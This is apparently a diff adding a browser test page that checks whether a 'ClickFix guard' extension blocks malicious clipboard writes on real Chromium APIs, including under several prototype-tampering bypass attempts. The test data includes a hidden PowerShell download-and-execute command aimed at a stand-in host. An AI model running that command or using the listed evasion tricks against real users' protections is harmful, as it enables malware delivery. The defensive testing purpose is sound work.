@@ -1,0 +1,282 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>ClickFix guard: live Chromium check</title>
+<style>
+  :root { color-scheme: light dark; font: 14px/1.5 system-ui, sans-serif; }
+  body { margin: 0; padding: 24px 24px 120px; max-width: 900px; }
+  h1 { font-size: 18px; margin: 0 0 4px; }
+  p.lede { margin: 0 0 20px; opacity: .75; }
+  button { font: inherit; padding: 10px 18px; border-radius: 8px; cursor: pointer; }
+  table { border-collapse: collapse; width: 100%; margin-top: 20px; }
+  th, td { text-align: left; padding: 6px 8px; border-bottom: 1px solid rgba(128,128,128,.3);
+           vertical-align: top; }
+  td.v { white-space: nowrap; font-weight: 600; }
+  .ok { color: #15803d; } .bad { color: #b91c1c; }
+  code { font-size: 12px; opacity: .8; word-break: break-all; }
+  #summary { margin-top: 16px; font-weight: 600; }
+</style>
+</head>
+<body>
+<h1>ClickFix guard &mdash; live Chromium check</h1>
+<p class="lede">
+  The Node suite runs against hand-written stubs. This page runs the same attacks
+  against the real <code>Clipboard</code>, <code>DataTransfer</code>,
+  <code>Document</code> and <code>HTMLInputElement</code>, and against the real
+  WebIDL <code>sequence&lt;T&gt;</code> conversion. Click the button so the guard
+  sees a genuinely trusted gesture.
+</p>
+<p><button id="run">Run the checks</button></p>
+<div id="out"></div>
+<div id="summary"></div>
+
+<!-- The guard installs itself on load, exactly as the MAIN-world content script
+     does, before any of the tampering below happens. -->
+<script src="../../clickfix-guard.js"></script>
+<script>
+(() => {
+  const results = [];
+  const check = (name, ok, detail = "") => results.push({ name, ok: Boolean(ok), detail: String(detail) });
+
+  // The guard announces every verdict as a CustomEvent, which is how this page
+  // observes its decisions without needing clipboard-read permission.
+  const verdicts = [];
+  addEventListener("advanced-blocker-clipboard-guard", (e) => verdicts.push(e.detail && e.detail.verdict));
+  const sinceLast = () => verdicts.length;
+  const verdictAfter = (mark) => verdicts.slice(mark);
+
+  const PAYLOAD = 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"';
+  const swallow = (p) => (p && typeof p.then === "function" ? p.then(() => {}, () => {}) : Promise.resolve());
+
+  async function run() {
+    // ---- 1. did lockMethod actually work on real platform prototypes? ------
+    const targets = [
+      ["Clipboard.prototype.writeText", window.Clipboard && Clipboard.prototype, "writeText"],
+      ["Clipboard.prototype.write", window.Clipboard && Clipboard.prototype, "write"],
+      ["DataTransfer.prototype.setData", window.DataTransfer && DataTransfer.prototype, "setData"],
+      ["Document.prototype.execCommand", Document.prototype, "execCommand"]
+    ];
+    for (const [label, holder, name] of targets) {
+      const d = holder && Object.getOwnPropertyDescriptor(holder, name);
+      const wrapped = Boolean(d) && typeof d.value === "function" &&
+        !/\[native code\]/.test(d.value.toString());
+      check(`${label} is wrapped by the guard`, wrapped,
+        d ? `configurable=${d.configurable} writable=${d.writable}` : "no own descriptor");
+      check(`${label} descriptor is non-configurable and non-writable`,
+        Boolean(d) && d.configurable === false && d.writable === false,
+        d ? `configurable=${d.configurable} writable=${d.writable}` : "no own descriptor");
+      // A locked wrapper must survive the page trying to remove it.
+      let removal = "deleted";
+      try { removal = (delete holder[name]) ? "deleted" : "refused"; }
+      catch (e) { removal = `threw ${e.name}`; }
+      const stillWrapped = Boolean(holder) && typeof holder[name] === "function" &&
+        !/\[native code\]/.test(holder[name].toString());
+      check(`${label} survives delete`, removal !== "deleted" && stillWrapped, removal);
+      let redefined = "redefined";
+      try {
+        Object.defineProperty(holder, name, { value: function () {}, configurable: true });
+      } catch (e) { redefined = `threw ${e.name}`; }
+      check(`${label} cannot be redefined`, redefined !== "redefined", redefined);
+    }
+
+    // ---- 2. the spec assumption sealSequence depends on --------------------
+    // WebIDL sequence<T> conversion does GetMethod(value, @@iterator). The guard
+    // gives its snapshot an OWN non-writable @@iterator so a replaced
+    // Array.prototype[Symbol.iterator] cannot redirect the native's pass.
+    // URLSearchParams takes sequence<sequence<USVString>> and is fully
+    // observable, so it answers the question without any permission.
+    {
+      const arr = [["a", "own"]];
+      const own = function () {
+        const items = [["a", "own"]];
+        let i = 0;
+        return { next: () => (i < items.length ? { value: items[i++], done: false }
+                                               : { value: undefined, done: true }) };
+      };
+      Object.defineProperty(arr, Symbol.iterator, {
+        configurable: false, enumerable: false, writable: false, value: own
+      });
+      const realIter = Array.prototype[Symbol.iterator];
+      Array.prototype[Symbol.iterator] = function () {
+        const items = [["a", "prototype"]];
+        let i = 0;
+        return { next: () => (i < items.length ? { value: items[i++], done: false }
+                                               : { value: undefined, done: true }) };
+      };
+      let got = "(threw)";
+      try { got = new URLSearchParams(arr).get("a"); }
+      catch (e) { got = `threw ${e.name}`; }
+      finally { Array.prototype[Symbol.iterator] = realIter; }
+      check("WebIDL sequence conversion prefers an own @@iterator over the prototype's",
+        got === "own", `conversion used the ${got} iterator`);
+    }
+
+    // ---- 3. the stub assumption behind the value-shadow fix ----------------
+    const valueGetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").get;
+    {
+      let threw = "did not throw";
+      try { valueGetter.call({}); } catch (e) { threw = `threw ${e.name}`; }
+      check("the input value getter rejects a foreign receiver",
+        threw !== "did not throw", threw);
+
+      const input = document.createElement("input");
+      input.value = PAYLOAD;
+      Object.defineProperty(input, "value", { configurable: true, get: () => "harmless text" });
+      check("the captured value getter reads the internal slot, not an own shadow",
+        valueGetter.call(input) === PAYLOAD,
+        `getter returned ${JSON.stringify(valueGetter.call(input))}`);
+      check("reading value by NAME is what the shadow captures",
+        input.value === "harmless text", JSON.stringify(input.value));
+    }
+
+    // ---- 4. the bypasses, against real objects ----------------------------
+    // Each arms one tamper, drives the real wrapper, and asserts the guard still
+    // reached a block. No block event means the classifier was fooled.
+    const attacks = [
+      ["RegExp.prototype.exec = () => null", () => {
+        const real = RegExp.prototype.exec;
+        RegExp.prototype.exec = function () { return null; };
+        return () => { RegExp.prototype.exec = real; };
+      }],
+      ["RegExp.prototype.test = () => false", () => {
+        const real = RegExp.prototype.test;
+        RegExp.prototype.test = function () { return false; };
+        return () => { RegExp.prototype.test = real; };
+      }],
+      ["Array.prototype.reduce = () => 0", () => {
+        const real = Array.prototype.reduce;
+        Array.prototype.reduce = function () { return 0; };
+        return () => { Array.prototype.reduce = real; };
+      }],
+      ["String.prototype.toLowerCase = () => ''", () => {
+        const real = String.prototype.toLowerCase;
+        String.prototype.toLowerCase = function () { return ""; };
+        return () => { String.prototype.toLowerCase = real; };
+      }],
+      ["Function.prototype.call hijacked", () => {
+        const real = Function.prototype.call;
+        Function.prototype.call = function (...a) { return real.apply(this, a); };
+        return () => { Function.prototype.call = real; };
+      }],
+      ["Promise.prototype.constructor replaced", () => {
+        const real = Promise.prototype.constructor;
+        Promise.prototype.constructor = function NotPromise() {};
+        return () => { Promise.prototype.constructor = real; };
+      }],
+      ["no tampering (control)", () => () => {}]
+    ];
+
+    for (const [label, arm] of attacks) {
+      const mark = sinceLast();
+      let disarm = () => {};
+      let error = "";
+      try {
+        disarm = arm();
+        await swallow(navigator.clipboard.writeText(PAYLOAD));
+      } catch (e) { error = ` (${e.name})`; }
+      finally { disarm(); }
+      const got = verdictAfter(mark);
+      check(`writeText still blocks with ${label}`,
+        got.includes("block"),
+        `verdicts: ${got.length ? got.join(",") : "(none - classifier saw nothing)"}${error}`);
+    }
+
+    // ---- 5. ordinary text must still get through --------------------------
+    {
+      const mark = sinceLast();
+      let error = "";
+      try { await swallow(navigator.clipboard.writeText("just some ordinary text")); }
+      catch (e) { error = e.name; }
+      check("ordinary text raises no verdict",
+        verdictAfter(mark).length === 0,
+        `verdicts: ${verdictAfter(mark).join(",") || "(none)"} ${error}`);
+    }
+
+    // ---- 6. clipboard.write with a real ClipboardItem ---------------------
+    if (window.ClipboardItem) {
+      const mark = sinceLast();
+      let error = "";
+      try {
+        const item = new ClipboardItem({ "text/plain": new Blob([PAYLOAD], { type: "text/plain" }) });
+        await swallow(navigator.clipboard.write([item]));
+      } catch (e) { error = ` (${e.name})`; }
+      check("clipboard.write blocks a real ClipboardItem payload",
+        verdictAfter(mark).includes("block"),
+        `verdicts: ${verdictAfter(mark).join(",") || "(none)"}${error}`);
+    } else {
+      check("ClipboardItem available", false, "not in this browser");
+    }
+
+    // ---- 7. setData on a real DataTransfer --------------------------------
+    {
+      const mark = sinceLast();
+      let error = "";
+      try { new DataTransfer().setData("text/plain", PAYLOAD); }
+      catch (e) { error = ` (${e.name})`; }
+      check("setData blocks a payload on a real DataTransfer",
+        verdictAfter(mark).includes("block"),
+        `verdicts: ${verdictAfter(mark).join(",") || "(none)"}${error}`);
+    }
+
+    // ---- 8. execCommand("copy") over a real focused input -----------------
+    {
+      const input = document.createElement("input");
+      input.value = PAYLOAD;
+      document.body.appendChild(input);
+      input.focus();
+      input.select();
+      const mark = sinceLast();
+      let ret = "(threw)";
+      try { ret = document.execCommand("copy"); } catch (e) { ret = `threw ${e.name}`; }
+      input.remove();
+      check("execCommand copy of a payload in a focused input is refused",
+        ret === false && verdictAfter(mark).includes("block"),
+        `returned ${ret}, verdicts: ${verdictAfter(mark).join(",") || "(none)"}`);
+    }
+
+    // ---- 9. the shadowed input, end to end --------------------------------
+    {
+      const input = document.createElement("input");
+      input.value = PAYLOAD;
+      document.body.appendChild(input);
+      input.focus();
+      input.select();
+      Object.defineProperty(input, "value", { configurable: true, get: () => "harmless text" });
+      const mark = sinceLast();
+      let ret = "(threw)";
+      try { ret = document.execCommand("copy"); } catch (e) { ret = `threw ${e.name}`; }
+      input.remove();
+      check("a shadowed value cannot hide the payload from execCommand",
+        ret === false && verdictAfter(mark).includes("block"),
+        `returned ${ret}, verdicts: ${verdictAfter(mark).join(",") || "(none)"}`);
+    }
+
+    render();
+  }
+
+  function render() {
+    const rows = results.map((r) =>
+      `<tr><td class="v ${r.ok ? "ok" : "bad"}">${r.ok ? "PASS" : "FAIL"}</td>` +
+      `<td>${r.name}<br><code>${r.detail.replace(/[<&]/g, (c) => (c === "<" ? "&lt;" : "&amp;"))}</code></td></tr>`
+    ).join("");
+    document.getElementById("out").innerHTML =
+      `<table><thead><tr><th>Result</th><th>Check</th></tr></thead><tbody>${rows}</tbody></table>`;
+    const failed = results.filter((r) => !r.ok);
+    document.getElementById("summary").textContent =
+      `${results.length - failed.length}/${results.length} checks passed` +
+      (failed.length ? ` — FAILED: ${failed.map((f) => f.name).join("; ")}` : "");
+    // Machine-readable, for reading back without scraping the table.
+    window.__liveResults = { total: results.length, failed: failed.length, results };
+  }
+
+  document.getElementById("run").addEventListener("click", () => {
+    run().catch((e) => {
+      check("harness completed", false, `${e.name}: ${e.message}`);
+      render();
+    });
+  });
+})();
+</script>
+</body>
+</html>
